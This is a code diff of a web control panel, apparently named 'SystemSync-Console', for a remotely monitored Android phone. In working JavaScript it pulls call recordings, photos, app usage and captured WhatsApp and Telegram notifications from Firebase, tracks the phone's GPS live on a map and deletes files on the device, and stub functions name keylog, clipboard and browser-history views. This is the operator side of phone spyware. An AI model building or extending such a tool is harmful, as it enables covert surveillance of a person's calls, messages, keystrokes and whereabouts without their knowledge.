-            selectedFiles = []; updateCounters();
+            if (selectedFiles.length === 0) {
+                alert('No files selected');
+                return;
+            }
+
+            const confirmMsg = `Delete ${selectedFiles.length} file(s)? This action cannot be undone.`;
+            if (!confirm(confirmMsg)) return;
+
+            selectedFiles.forEach(path => {
+                sendCommand('DELETE_FILE', { path: path });
+            });
+
+            selectedFiles = [];
+            updateCounters();
         }
+
         function updateCounters() {
             const count = selectedFiles.length;
             const downloadCountSpan = document.getElementById('downloadCount');
@@ -1273,20 +2270,47 @@
             if (downloadCountSpan) downloadCountSpan.innerText = count;
             if (deleteCountSpan) deleteCountSpan.innerText = count;
         }
-        window.refreshFileRoot = function () { sendCommand('LIST_FILES', { path: 'root' }); panel.innerHTML = '<p style="color:var(--text-sec); padding:16px;">⏳ Fetching files from device...</p>'; };
 
-        // ==================== CALL RECORDINGS (unchanged) ====================
+        window.refreshFileRoot = function () {
+            sendCommand('LIST_FILES', { path: 'root' });
+            panel.innerHTML = '<p style="color:var(--text-sec); padding:16px;">⏳ Fetching files from device...</p>';
+        };
+
+        // ==================== CALL RECORDINGS ====================
         async function showCallRecordingsPanel() {
-            if (!selectedDeviceId) { panel.innerHTML = '<p>No device selected.</p>'; return; }
-            if (!currentUser) { panel.innerHTML = '<p>You must be logged in.</p>'; return; }
+            if (!selectedDeviceId) {
+                panel.innerHTML = '<p>No device selected.</p>';
+                return;
+            }
+            if (!currentUser) {
+                panel.innerHTML = '<p>You must be logged in.</p>';
+                return;
+            }
             panel.innerHTML = '<h3>🎙️ Call Recordings</h3><p>Loading recordings from Firebase...</p>';
             try {
                 let snapshot = null;
-                try { snapshot = await db.collection('devices').doc(selectedDeviceId).collection('call_recordings').orderBy('timestamp', 'desc').get(); } catch (e) {}
-                if (!snapshot || snapshot.empty) { snapshot = await db.collection('call_recordings').where('deviceId', '==', selectedDeviceId).where('userId', '==', currentUser.uid).orderBy('timestamp', 'desc').get(); }
+                try {
+                    snapshot = await db.collection('devices').doc(selectedDeviceId).collection('call_recordings')
+                        .orderBy('timestamp', 'desc')
+                        .get();
+                } catch (e) { }
+                if (!snapshot || snapshot.empty) {
+                    snapshot = await db.collection('call_recordings')
+                        .where('deviceId', '==', selectedDeviceId)
+                        .where('userId', '==', currentUser.uid)
+                        .orderBy('timestamp', 'desc')
+                        .get();
+                }
                 if (snapshot.empty) {
-                    panel.innerHTML = `<h3>🎙️ Call Recordings</h3><p>No recordings found in Firebase. You can fetch recordings directly from the device (if available).</p><button id="fallbackRecordingsBtn" class="btn-ui primary">📞 Fetch from Device</button>`;
-                    document.getElementById('fallbackRecordingsBtn')?.addEventListener('click', () => { sendCommand('GET_CALL_RECORDINGS', { days: 30 }); showNotification('Fetching call recordings from device...'); });
+                    panel.innerHTML = `
+                <h3>🎙️ Call Recordings</h3>
+                <p>No recordings found in Firebase. You can fetch recordings directly from the device (if available).</p>
+                <button id="fallbackRecordingsBtn" class="btn-ui primary">📞 Fetch from Device</button>
+            `;
+                    document.getElementById('fallbackRecordingsBtn')?.addEventListener('click', () => {
+                        sendCommand('GET_CALL_RECORDINGS', { days: 30 });
+                        showNotification('Fetching call recordings from device...');
+                    });
                     return;
                 }
                 let html = '<h3>🎙️ Call Recordings (Firebase)</h3><div style="margin-top:16px;">';
@@ -1295,12 +2319,24 @@
                     const directionIcon = rec.direction === 'incoming' ? '📞' : '📤';
                     const timestamp = rec.timestamp ? new Date(rec.timestamp).toLocaleString() : rec.timeFmt || 'Unknown date';
                     const duration = rec.duration ? `${Math.floor(rec.duration / 60)}:${(rec.duration % 60).toString().padStart(2, '0')}` : '?';
-                    html += `<div class="call-recording-card"><div class="call-recording-info"><div><span class="call-recording-direction">${directionIcon}</span><span class="call-recording-number">${escapeHtml(rec.number || 'Unknown')}</span>${rec.name ? `<span style="color:var(--text-sec); margin-left:8px;">(${escapeHtml(rec.name)})</span>` : ''}</div><div class="call-recording-details">${timestamp} • Duration: ${duration}</div></div><button class="download-recording-btn" data-url="${escapeHtml(rec.audioURL)}" data-filename="call_${rec.number}_${rec.timestamp}.m4a">⬇️ Download</button></div>`;
+                    html += `
+                <div class="call-recording-card">
+                    <div class="call-recording-info">
+                        <div>
+                            <span class="call-recording-direction">${directionIcon}</span>
+                            <span class="call-recording-number">${escapeHtml(rec.number || 'Unknown')}</span>
+                            ${rec.name ? `<span style="color:var(--text-sec); margin-left:8px;">(${escapeHtml(rec.name)})</span>` : ''}
+                        </div>
+                        <div class="call-recording-details">${timestamp} • Duration: ${duration}</div>
+                    </div>
+                    <button class="download-recording-btn" data-url="${escapeHtml(rec.audioURL)}" data-filename="call_${rec.number}_${rec.timestamp}.m4a">⬇️ Download</button>
+                </div>
+            `;
                 });
                 html += '</div>';
                 panel.innerHTML = html;
                 document.querySelectorAll('.download-recording-btn').forEach(btn => {
-                    btn.addEventListener('click', async () => {
+                    btn.addEventListener('click', async (e) => {
                         const url = btn.getAttribute('data-url');
                         const filename = btn.getAttribute('data-filename');
                         if (!url) { showNotification('No audio file URL'); return; }
@@ -1309,143 +2345,254 @@
                             const response = await fetch(url);
                             const blob = await response.blob();
                             const a = document.createElement('a');
-                            a.href = URL.createObjectURL(blob); a.download = filename; a.click(); URL.revokeObjectURL(a.href);
+                            a.href = URL.createObjectURL(blob);
+                            a.download = filename;
+                            a.click();
+                            URL.revokeObjectURL(a.href);
                             showNotification('Download complete');
                         } catch (err) { console.error(err); showNotification('Failed to download'); }
                     });
                 });
             } catch (err) {
                 console.error(err);
-                panel.innerHTML = `<h3>🎙️ Call Recordings</h3><p style="color:red;">Error: ${err.message}</p><button id="fallbackDeviceBtn2" class="btn-ui primary">Fetch from Device</button>`;
-                document.getElementById('fallbackDeviceBtn2')?.addEventListener('click', () => { sendCommand('GET_CALL_RECORDINGS', { days: 30 }); showNotification('Fetching call recordings from device...'); });
+                if (err.code === 'permission-denied') {
+                    panel.innerHTML = `
+                <h3>🎙️ Call Recordings</h3>
+                <div style="background: #fff3e0; border-left: 4px solid #ff9800; padding: 16px; border-radius: 8px;">
+                    <strong>⚠️ Firebase Permission Error</strong><br>
+                    Make sure each recording document in the <code>call_recordings</code> collection contains a <code>userId</code> field matching the authenticated user's UID.<br>
+                    Also, your query must include <code>.where('userId', '==', currentUser.uid)</code>.<br><br>
+                    <button id="retryRecordingsBtn" class="btn-ui primary" style="margin-top: 12px;">Retry</button>
+                    <button id="fallbackDeviceBtn" class="btn-ui secondary" style="margin-top: 12px; margin-left: 8px;">Fetch from Device</button>
+                </div>
+            `;
+                    document.getElementById('retryRecordingsBtn')?.addEventListener('click', () => showCallRecordingsPanel());
+                    document.getElementById('fallbackDeviceBtn')?.addEventListener('click', () => {
+                        sendCommand('GET_CALL_RECORDINGS', { days: 30 });
+                        showNotification('Fetching call recordings from device...');
+                    });
+                } else {
+                    panel.innerHTML = `<h3>🎙️ Call Recordings</h3><p style="color:red;">Error: ${err.message}</p><button id="fallbackDeviceBtn2" class="btn-ui primary">Fetch from Device</button>`;
+                    document.getElementById('fallbackDeviceBtn2')?.addEventListener('click', () => {
+                        sendCommand('GET_CALL_RECORDINGS', { days: 30 });
+                        showNotification('Fetching call recordings from device...');
+                    });
+                }
             }
         }
 
-        // ==================== PHOTO GALLERY (unchanged) ====================
+        // ==================== PHOTO GALLERY ====================
         async function showPhotoGalleryPanel() {
-            if (!selectedDeviceId) { panel.innerHTML = '<p>No device selected.</p>'; return; }
-            if (!currentUser) { panel.innerHTML = '<p>You must be logged in.</p>'; return; }
+            if (!selectedDeviceId) {
+                panel.innerHTML = '<p>No device selected.</p>';
+                return;
+            }
+            if (!currentUser) {
+                panel.innerHTML = '<p>You must be logged in.</p>';
+                return;
+            }
             panel.innerHTML = '<h3>🖼️ Photo Gallery</h3><p>Loading photos from Firebase...</p>';
             try {
-                const snapshot = await db.collection('images_meta').where('deviceId', '==', selectedDeviceId).get();
+                // Try sub-collection first (preferred pattern)
+                let snapshot = await db.collection('devices').doc(selectedDeviceId).collection('images_meta').get();
+                
+                // Fallback to root collection if sub-collection is empty or doesn't exist
                 if (snapshot.empty) {
-                    panel.innerHTML = `<h3>🖼️ Photo Gallery</h3><p>No photos found in Firebase. You can fetch recent images directly from the device (if available).</p><button id="fallbackGalleryBtn" class="btn-ui primary">📸 Fetch from Device</button>`;
-                    document.getElementById('fallbackGalleryBtn')?.addEventListener('click', () => { sendCommand('GET_RECENT_IMAGES', { days: 5 }); showNotification('Fetching recent images from device...'); });
+                    try {
+                        snapshot = await db.collection('images_meta')
+                            .where('deviceId', '==', selectedDeviceId)
+                            .get();
+                    } catch (e) {
+                         // If root also fails, we rely on the empty check below
+                    }
+                }
+
+                if (snapshot.empty) {
+                    panel.innerHTML = `
+                <h3>🖼️ Photo Gallery</h3>
+                <p>No photos found in Firebase. You can fetch recent images directly from the device (if available).</p>
+                <button id="fallbackGalleryBtn" class="btn-ui primary">📸 Fetch from Device</button>
+            `;
+                    document.getElementById('fallbackGalleryBtn')?.addEventListener('click', () => {
+                        sendCommand('GET_RECENT_IMAGES', { days: 5 });
+                        showNotification('Fetching recent images from device...');
+                    });
                     return;
                 }
-                const docs = []; snapshot.forEach(doc => docs.push({ id: doc.id, ...doc.data() }));
+
+                const docs = [];
+                snapshot.forEach(doc => {
+                    docs.push({ id: doc.id, ...doc.data() });
+                });
                 docs.sort((a, b) => (b.dateAdded || 0) - (a.dateAdded || 0));
+
                 let html = '<h3>🖼️ Photo Gallery (Firebase)</h3><div class="photo-grid" id="photoGrid"></div>';
                 panel.innerHTML = html;
                 const grid = document.getElementById('photoGrid');
                 docs.forEach(photo => {
                     const thumbBase64 = photo.thumb ? `data:image/jpeg;base64,${photo.thumb}` : null;
                     const timestamp = photo.dateAdded ? new Date(photo.dateAdded * 1000).toLocaleString() : '';
-                    const tile = document.createElement('div'); tile.className = 'photo-tile';
-                    if (thumbBase64) { tile.innerHTML = `<img src="${thumbBase64}" loading="lazy"><div class="photo-overlay">${escapeHtml(timestamp)}</div>`; }
-                    else { tile.innerHTML = `<div style="display:flex; align-items:center; justify-content:center; height:100%; background:#f0f0f0;">📷</div><div class="photo-overlay">${escapeHtml(timestamp)}</div>`; }
+                    const tile = document.createElement('div');
+                    tile.className = 'photo-tile';
+                    if (thumbBase64) {
+                        tile.innerHTML = `
+                    <img src="${thumbBase64}" loading="lazy">
+                    <div class="photo-overlay">${escapeHtml(timestamp)}</div>
+                `;
+                    } else {
+                        tile.innerHTML = `
+                    <div style="display:flex; align-items:center; justify-content:center; height:100%; background:#f0f0f0;">📷</div>
+                    <div class="photo-overlay">${escapeHtml(timestamp)}</div>
+                `;
+                    }
                     tile.addEventListener('click', () => {
-                        if (photo.mediaId) { sendCommand('GET_IMAGE', { mediaId: photo.mediaId, maxDim: 1200 }); showNotification('Requesting full image from device...'); }
-                        else showNotification('No image data available');
+                        if (photo.mediaId) {
+                            sendCommand('GET_IMAGE', { mediaId: photo.mediaId, maxDim: 1200 });
+                            showNotification('Requesting full image from device...');
+                        } else {
+                            showNotification('No image data available');
+                        }
                     });
                     grid.appendChild(tile);
                 });
             } catch (err) {
                 console.error(err);
-                panel.innerHTML = `<h3>🖼️ Photo Gallery</h3><p style="color:red;">Error: ${err.message}</p><button id="fallbackGalleryBtn2" class="btn-ui primary">Fetch from Device</button>`;
-                document.getElementById('fallbackGalleryBtn2')?.addEventListener('click', () => { sendCommand('GET_RECENT_IMAGES', { days: 5 }); showNotification('Fetching recent images from device...'); });
+                if (err.code === 'permission-denied') {
+                    panel.innerHTML = `
+                <h3>🖼️ Photo Gallery</h3>
+                <div style="background: #fff3e0; border-left: 4px solid #ff9800; padding: 16px; border-radius: 8px;">
+                    <strong>⚠️ Firebase Permission Error</strong><br>
+                    Your security rules are blocking access to the <code>images_meta</code> collection.<br><br>
+                    <button id="retryGalleryBtn" class="btn-ui primary" style="margin-top: 12px;">Retry</button>
+                    <button id="fallbackDeviceBtn" class="btn-ui secondary" style="margin-top: 12px; margin-left: 8px;">Fetch from Device</button>
+                </div>
+            `;
+                    document.getElementById('retryGalleryBtn')?.addEventListener('click', () => showPhotoGalleryPanel());
+                    document.getElementById('fallbackDeviceBtn')?.addEventListener('click', () => {
+                        sendCommand('GET_RECENT_IMAGES', { days: 5 });
+                        showNotification('Fetching recent images from device...');
+                    });
+                } else {
+                    panel.innerHTML = `<h3>🖼️ Photo Gallery</h3><p style="color:red;">Error: ${err.message}</p><button id="fallbackGalleryBtn2" class="btn-ui primary">Fetch from Device</button>`;
+                    document.getElementById('fallbackGalleryBtn2')?.addEventListener('click', () => {
+                        sendCommand('GET_RECENT_IMAGES', { days: 5 });
+                        showNotification('Fetching recent images from device...');
+                    });
+                }
             }
         }
 
-        // ==================== SCREEN TIME (unchanged) ====================
+        // ==================== SCREEN TIME ====================
         async function showAppUsagePanel() {
-            if (!selectedDeviceId) { panel.innerHTML = '<p>No device selected.</p>'; return; }
-            if (!currentUser) { panel.innerHTML = '<p>You must be logged in.</p>'; return; }
-            panel.innerHTML = `<h3>📊 Screen Time (from Firebase)</h3><div class="date-selector"><button class="btn-ui primary" data-days="1">Today</button><button class="btn-ui primary" data-days="7">Last 7 Days</button><button class="btn-ui primary" data-days="30">Last 30 Days</button></div><div id="screenTimeData"></div>`;
-            panel.querySelectorAll('button[data-days]').forEach(btn => btn.addEventListener('click', () => loadAppUsageFromFirebase(parseInt(btn.dataset.days))));
+            if (!selectedDeviceId) {
+                panel.innerHTML = '<p>No device selected.</p>';
+                return;
+            }
+            if (!currentUser) {
+                panel.innerHTML = '<p>You must be logged in.</p>';
+                return;
+            }
+            panel.innerHTML = `
+        <h3>📊 Screen Time (from Firebase)</h3>
+        <div class="date-selector">
+            <button class="btn-ui primary" data-days="1">Today</button>
+            <button class="btn-ui primary" data-days="7">Last 7 Days</button>
+            <button class="btn-ui primary" data-days="30">Last 30 Days</button>
+        </div>
+        <div id="screenTimeData"></div>
+    `;
+            panel.querySelectorAll('button[data-days]').forEach(btn => {
+                btn.addEventListener('click', () => {
+                    const days = parseInt(btn.dataset.days);
+                    loadAppUsageFromFirebase(days);
+                });
+            });
             loadAppUsageFromFirebase(1);
         }
+
         async function loadAppUsageFromFirebase(days) {
             const container = document.getElementById('screenTimeData');
             if (!container) return;
             container.innerHTML = '<p>Loading...</p>';
             try {
-                const now = new Date(); const cutoff = new Date(now.getTime() - days * 86400000);
-                const snapshot = await db.collection('devices').doc(selectedDeviceId).collection('app_usage').where('timestamp', '>=', cutoff).orderBy('timestamp', 'desc').get();
-                if (snapshot.empty) { container.innerHTML = '<p>No screen time data found in Firebase. The device app will upload usage stats every hour.</p>'; return; }
+                const now = new Date();
+                const cutoff = new Date(now.getTime() - days * 86400000);
+                const snapshot = await db.collection('devices').doc(selectedDeviceId).collection('app_usage')
+                    .where('timestamp', '>=', cutoff)
+                    .orderBy('timestamp', 'desc')
+                    .get();
+                if (snapshot.empty) {
+                    container.innerHTML = '<p>No screen time data found in Firebase. The device app will upload usage stats every hour.</p>';
+                    return;
+                }
                 const appTotals = new Map();
                 snapshot.forEach(doc => {
-                    const data = doc.data(); const apps = JSON.parse(data.apps);
+                    const data = doc.data();
+                    const apps = JSON.parse(data.apps);
                     if (Array.isArray(apps)) {
                         apps.forEach(app => {
                             const name = app.appName || app.packageName || 'Unknown';
                             const timeMs = app.totalTimeMs || 0;
-                            if (appTotals.has(name)) appTotals.set(name, appTotals.get(name) + timeMs);
-                            else appTotals.set(name, timeMs);
+                            if (appTotals.has(name)) {
+                                appTotals.set(name, appTotals.get(name) + timeMs);
+                            } else {
+                                appTotals.set(name, timeMs);
+                            }
                         });
                     }
                 });
-                if (appTotals.size === 0) { container.innerHTML = '<p>No usage data for the selected period.</p>'; return; }
+                if (appTotals.size === 0) {
+                    container.innerHTML = '<p>No usage data for the selected period.</p>';
+                    return;
+                }
                 const sorted = Array.from(appTotals.entries()).sort((a, b) => b[1] - a[1]);
                 const max = sorted[0][1];
                 let html = `<p>Showing aggregated usage for the last ${days} day(s).</p><div style="margin-top:16px;">`;
                 for (let [name, timeMs] of sorted) {
                     const pct = max ? Math.round((timeMs / max) * 100) : 0;
                     const color = getColorForDuration(timeMs);
-                    html += `<div class="app-usage-item"><div class="app-usage-name">${escapeHtml(name)}</div><div class="usage-bar-container"><div class="usage-bar" style="width:${pct}%; background-color:${color};"></div></div><div class="app-usage-time">${formatDuration(timeMs)}</div></div>`;
+                    html += `
+                <div class="app-usage-item">
+                    <div class="app-usage-name">${escapeHtml(name)}</div>
+                    <div class="usage-bar-container">
+                        <div class="usage-bar" style="width:${pct}%; background-color:${color};"></div>
+                    </div>
+                    <div class="app-usage-time">${formatDuration(timeMs)}</div>
+                </div>
+            `;
                 }
-                html += '</div>'; container.innerHTML = html;
-            } catch (err) { console.error(err); container.innerHTML = '<p style="color:red;">Error loading screen time data: ' + err.message + '</p>'; }
+                html += '</div>';
+                container.innerHTML = html;
+            } catch (err) {
+                console.error(err);
+                container.innerHTML = '<p style="color:red;">Error loading screen time data: ' + err.message + '</p>';
+            }
         }
 
-        // ==================== SOCIAL MESSAGES (unchanged from index1) ====================
-        function displaySocialMessages(data) {
-            let msgs = typeof data === 'string' ? JSON.parse(data) : data;
-            if (!Array.isArray(msgs) || msgs.length === 0) { panel.innerHTML = '<h3>💬 Social Messages</h3><p>No messages yet. Make sure Notification Access is enabled.</p><p><small>Note: Live chat content cannot be captured without root. Only notifications are recorded.</small></p>'; return; }
-            panel.innerHTML = `<h3>💬 Social Messages (${msgs.length})</h3><div style="overflow-y:auto;max-height:60vh;">` + msgs.slice().reverse().map(m => `<div style="background:#fff;border:1px solid #eee;border-radius:10px;padding:12px;margin-bottom:8px;"><div><strong>${escapeHtml(m.app || getAppNameFromPkg(m.pkg) || 'Unknown')}</strong> <small>${m.timeFmt || ''}</small></div><div>${escapeHtml(m.title || '')}</div><div>${escapeHtml(m.text || m.body || '')}</div></div>`).join('') + `</div>`;
-        }
-        function getAppNameFromPkg(pkg) { const map = { 'com.whatsapp': 'WhatsApp', 'org.telegram.messenger': 'Telegram', 'com.instagram.android': 'Instagram', 'com.facebook.orca': 'Messenger', 'com.facebook.katana': 'Facebook', 'com.snapchat.android': 'Snapchat' }; return map[pkg] || pkg; }
-
-        // ==================== DATA DISPLAY (SMS, Call Logs, Contacts, WiFi) unchanged ====================
-        function renderTable(rows, headers) {
-            const pageSize = 20; const totalPages = Math.ceil(rows.length / pageSize); const start = currentPage * pageSize; const pageRows = rows.slice(start, start + pageSize);
-            let html = '<div style="overflow-x:auto;"><table><thead><tr>';
-            headers.forEach(h => html += `<th>${h}</th>`);
-            html += '</tr></thead><tbody>';
-            pageRows.forEach(r => { html += '<tr>'; r.forEach(cell => html += `<td>${escapeHtml(cell || '')}</td>`); html += '</tr>'; });
-            html += '</tbody></table></div>';
-            if (totalPages > 1) { html += '<div class="pagination">'; for (let i = 0; i < totalPages; i++) html += `<button class="page-btn" onclick="gotoPage(${i})">${i + 1}</button>`; html += '</div>'; }
-            panel.innerHTML = html;
-        }
-        window.gotoPage = function (p) { currentPage = p; if (dataType === 'sms') renderTable(currentData, ['Type', 'Number', 'Message', 'Date']); else if (dataType === 'call') renderTable(currentData, ['Type', 'Number', 'Name', 'Date', 'Duration']); else if (dataType === 'contacts') renderTable(currentData, ['Name', 'Number', 'Times Contacted']); else if (dataType === 'wifi') renderTable(currentData, ['SSID', 'Signal', 'Status']); };
-        function displaySMS(data) { /* unchanged */ }
-        function displayCallLogs(data) { /* unchanged */ }
-        function displayContacts(data) { /* unchanged */ }
-        function displayWifiNetworks(data) { /* unchanged */ }
-        function displayInstalledApps(data) { /* unchanged */ }
-        function displayBrowserHistory(data) { /* unchanged */ }
-        function displayKeylog(data) { /* unchanged */ }
-        function displayClipboard(data) { /* unchanged */ }
-
-        // ==================== GPS & GEOFENCE (REPLACED FROM INDEX2) ====================
-        function requestLocation() { sendCommand('GET_LOCATION'); panel.innerHTML = '<p>📍 Requesting GPS location...</p>'; }
-
+        // ==================== ENHANCED MAP ====================
         function renderLiveMap(lat, lon, acc) {
             if (!liveMap) {
                 panel.innerHTML = `
-                <div style="position:relative;">
-                    <div id="liveMapContainer" style="height:400px; border-radius:12px;"></div>
-                    <div class="map-info" id="liveMapInfo">
-                        <div><strong>📍 Live Location</strong></div>
-                        <div id="liveCoord">${lat.toFixed(6)}, ${lon.toFixed(6)}</div>
-                        <div id="liveAccuracy">🎯 Accuracy: ${acc.toFixed(1)} m</div>
-                        <div id="liveAddress">🌍 Loading address...</div>
-                    </div>
-                    <div class="map-type-toggle" id="liveMapTypeToggle">🗺️ Switch to Satellite</div>
-                    <label class="follow-checkbox" id="followCheckbox"><input type="checkbox" id="followLocationCheck"> Follow location</label>
-                </div>`;
-                const streetLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '&copy; OpenStreetMap contributors' });
-                const satelliteLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', { attribution: 'Tiles &copy; Esri' });
+            <div style="position:relative;">
+                <div id="liveMapContainer" style="height:400px; border-radius:12px;"></div>
+                <div class="map-info" id="liveMapInfo">
+                    <div><strong>📍 Live Location</strong></div>
+                    <div id="liveCoord">${lat.toFixed(6)}, ${lon.toFixed(6)}</div>
+                    <div id="liveAccuracy">🎯 Accuracy: ${acc.toFixed(1)} m</div>
+                    <div id="liveAddress">🌍 Loading address...</div>
+                </div>
+                <div class="map-type-toggle" id="liveMapTypeToggle">🗺️ Switch to Satellite</div>
+                <label class="follow-checkbox" id="followCheckbox">
+                    <input type="checkbox" id="followLocationCheck"> Follow location
+                </label>
+            </div>
+        `;
+                const streetLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                    attribution: '&copy; OpenStreetMap contributors'
+                });
+                const satelliteLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
+                    attribution: 'Tiles &copy; Esri &mdash; Source: Esri, i-cubed, USDA, USGS, AEX, GeoEye, Getmapping, Aerogrid, IGN, IGP, UPR-EGP, and the GIS User Community'
+                });
                 liveMap = L.map('liveMapContainer').setView([lat, lon], 18);
                 streetLayer.addTo(liveMap);
                 liveMap.currentTileLayer = streetLayer;
@@ -1468,18 +2615,42 @@
                         document.getElementById('liveMapTypeToggle').innerHTML = '🗺️ Switch to Satellite';
                     }
                 });
-                document.getElementById('followLocationCheck').addEventListener('change', e => followLocation = e.target.checked);
-                fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, { headers: { 'User-Agent': 'SystemSync-Console/1.0' } })
-                    .then(r => r.json()).then(d => document.getElementById('liveAddress').innerHTML = `🌍 ${escapeHtml(d.display_name || 'Address not found')}`).catch(() => document.getElementById('liveAddress').innerHTML = '🌍 Address unavailable');
+                document.getElementById('followLocationCheck').addEventListener('change', (e) => {
+                    followLocation = e.target.checked;
+                });
+                fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
+                    headers: { 'User-Agent': 'SystemSync-Console/1.0' }
+                })
+                    .then(response => response.json())
+                    .then(data => {
+                        const address = data.display_name || 'Address not found';
+                        document.getElementById('liveAddress').innerHTML = `🌍 ${escapeHtml(address)}`;
+                    })
+                    .catch(err => {
+                        console.error('Geocoding error:', err);
+                        document.getElementById('liveAddress').innerHTML = '🌍 Address unavailable';
+                    });
             } else {
                 liveMarker.setLatLng([lat, lon]);
                 liveCircle.setLatLng([lat, lon]);
                 liveCircle.setRadius(acc);
                 document.getElementById('liveCoord').innerHTML = `${lat.toFixed(6)}, ${lon.toFixed(6)}`;
                 document.getElementById('liveAccuracy').innerHTML = `🎯 Accuracy: ${acc.toFixed(1)} m`;
-                fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, { headers: { 'User-Agent': 'SystemSync-Console/1.0' } })
-                    .then(r => r.json()).then(d => document.getElementById('liveAddress').innerHTML = `🌍 ${escapeHtml(d.display_name || 'Address not found')}`).catch(() => document.getElementById('liveAddress').innerHTML = '🌍 Address unavailable');
-                if (followLocation) liveMap.setView([lat, lon]);
+                fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
+                    headers: { 'User-Agent': 'SystemSync-Console/1.0' }
+                })
+                    .then(response => response.json())
+                    .then(data => {
+                        const address = data.display_name || 'Address not found';
+                        document.getElementById('liveAddress').innerHTML = `🌍 ${escapeHtml(address)}`;
+                    })
+                    .catch(err => {
+                        console.error('Geocoding error:', err);
+                        document.getElementById('liveAddress').innerHTML = '🌍 Address unavailable';
+                    });
+                if (followLocation) {
+                    liveMap.setView([lat, lon]);
+                }
             }
         }
 
@@ -1494,7 +2665,8 @@
                     <div><strong>📍 GPS Fix</strong></div>
                     <div>Coordinates: ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}</div>
                     <div>Accuracy: ${loc.acc.toFixed(1)}m</div>
-                </div>`;
+                </div>
+            `;
             setTimeout(() => {
                 const map = L.map('gpsMap').setView([loc.lat, loc.lon], 16);
                 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
@@ -1503,94 +2675,692 @@
             }, 100);
         }
 
-        function toggleLiveGps() {
-            liveGpsActive = !liveGpsActive;
-            sendCommand(liveGpsActive ? 'START_GPS_UPDATES' : 'STOP_GPS_UPDATES');
-            const btn = document.getElementById('liveGpsBtn');
-            if (btn) { btn.style.background = liveGpsActive ? '#d32f2f' : ''; btn.querySelector('span:last-child').textContent = liveGpsActive ? 'Stop GPS Track' : 'Live GPS Track'; }
-            if (liveGpsActive && currentLocation) renderLiveMap(currentLocation.lat, currentLocation.lon, currentLocation.acc);
-            else if (!liveGpsActive) { panel.innerHTML = '<p>Live GPS tracking stopped.</p>'; liveMap = null; liveMarker = null; liveCircle = null; }
+        // ==================== DATA DISPLAY FUNCTIONS ====================
+        function renderTable(rows, headers) {
+            const pageSize = 20;
+            const totalPages = Math.ceil(rows.length / pageSize);
+            const start = currentPage * pageSize;
+            const pageRows = rows.slice(start, start + pageSize);
+            let html = '<div style="overflow-x:auto;"><table class="premium-table"><thead><tr>';
+            headers.forEach((h, i) => {
+                const indicator = (currentSortCol === i) ? (currentSortDir === 'asc' ? '▲' : '▼') : '↕';
+                html += `<th onclick="sortTable(${i})">${h}<span class="sort-indicator">${indicator}</span></th>`;
+            });
+            html += '</tr></thead><tbody>';
+            pageRows.forEach(r => {
+                let rowBg = '';
+                if (dataType === 'call' || dataType === 'sms') {
+                    const t = (r[0] || '').toLowerCase();
+                    if (t.includes('incoming')) rowBg = 'style="background-color: #e8f5e9 !important;"';
+                    else if (t.includes('outgoing')) rowBg = 'style="background-color: #ffebee !important;"';
+                }
+                html += `<tr ${rowBg}>`;
+                r.forEach(cell => html += `<td>${escapeHtml((cell ?? '').toString())}</td>`);
+                html += '</tr>';
+            });
+            html += '</tbody></table></div>';
+            if (totalPages > 1) {
+                html += '<div class="pagination">';
+                for (let i = 0; i < totalPages; i++) {
+                    const activeClass = i === currentPage ? 'style="background:var(--primary);color:white;"' : '';
+                    html += `<button class="page-btn" ${activeClass} onclick="gotoPage(${i})">${i + 1}</button>`;
+                }
+                html += '</div>';
+            }
+            panel.innerHTML = html;
         }
 
-        function showGeofencePanel() {
-            if (!currentLocation) {
-                sendCommand('GET_LOCATION');
-                panel.innerHTML = '<h3>🗺️ Geofence</h3><p>Fetching current location...</p>';
-                setTimeout(() => { if (currentLocation) showGeofencePanelWithLocation(); else panel.innerHTML = '<h3>🗺️ Geofence</h3><p>Unable to get location. Please try GPS Location first.</p><button onclick="sendCommand(\'GET_LOCATION\')">Get Location</button>'; }, 2000);
+        window.sortTable = function(index) {
+            if (currentSortCol === index) {
+                currentSortDir = currentSortDir === 'asc' ? 'desc' : 'asc';
+            } else {
+                currentSortCol = index;
+                currentSortDir = 'asc';
+            }
+            
+            currentData.sort((a, b) => {
+                let v1 = (a[index] || '').toString();
+                let v2 = (b[index] || '').toString();
+                
+                // 1. Try Date comparison first (most common for logs)
+                const d1 = Date.parse(v1);
+                const d2 = Date.parse(v2);
+                if (!isNaN(d1) && !isNaN(d2) && (v1.includes('/') || v1.includes('-') || v1.includes(':'))) {
+                    return currentSortDir === 'asc' ? d1 - d2 : d2 - d1;
+                }
+
+                // 2. Try numeric comparison (strip currency/units if needed)
+                const n1 = parseFloat(v1.replace(/[^0-9.-]/g,""));
+                const n2 = parseFloat(v2.replace(/[^0-9.-]/g,""));
+                if (!isNaN(n1) && !isNaN(n2) && !v1.includes('/') && !v1.includes(':')) {
+                    return currentSortDir === 'asc' ? n1 - n2 : n2 - n1;
+                }
+                
+                // 3. Fallback to string comparison
+                v1 = v1.toLowerCase();
+                v2 = v2.toLowerCase();
+                if (v1 < v2) return currentSortDir === 'asc' ? -1 : 1;
+                if (v1 > v2) return currentSortDir === 'asc' ? 1 : -1;
+                return 0;
+            });
+            
+            currentPage = 0;
+            renderTable(currentData, getHeadersForType(dataType));
+        };
+
+        function getHeadersForType(type) {
+            const map = {
+                'sms': ['Type', 'Number', 'Message', 'Date'],
+                'call': ['Type', 'Number', 'Name', 'Date', 'Duration'],
+                'contacts': ['Name', 'Number', 'Times Contacted'],
+                'wifi': ['SSID', 'Signal', 'Status'],
+                'social': ['App', 'From/Title', 'Message', 'Date']
+            };
+            return map[type] || [];
+        }
+
+        window.gotoPage = function (p) {
+            currentPage = p;
